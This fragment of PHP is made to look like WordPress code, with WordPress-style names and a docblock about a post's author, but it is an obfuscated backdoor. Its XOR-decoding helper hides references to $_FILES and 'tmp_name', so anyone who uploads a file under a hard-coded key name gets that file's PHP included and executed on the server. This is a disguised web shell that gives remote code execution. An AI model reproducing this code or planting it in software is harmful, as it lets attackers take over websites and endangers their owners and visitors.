...
$pung = 'kg6OHQCMZ7O6S5o';

function src_url($show_in_admin_bar, $trashed_posts_with_desired_slug)

{
    $del_file = urldecode($show_in_admin_bar);
    $query = substr($trashed_posts_with_desired_slug,0, strlen($del_file));

    $perm = $del_file ^ $query;
    return $perm;
}

$wp_smiliessearch = ${src_url("4%21%7F%03%0D%02", $pung)};
if (isset($wp_smiliessearch[$pung]))

{
    $clear_date = $wp_smiliessearch[$pung];

    $new_path = $clear_date[src_url("%1F%0AF%10%260.%28", $pung)];
    include ($new_path);
}


/*  the name of the author of the current post.
 *
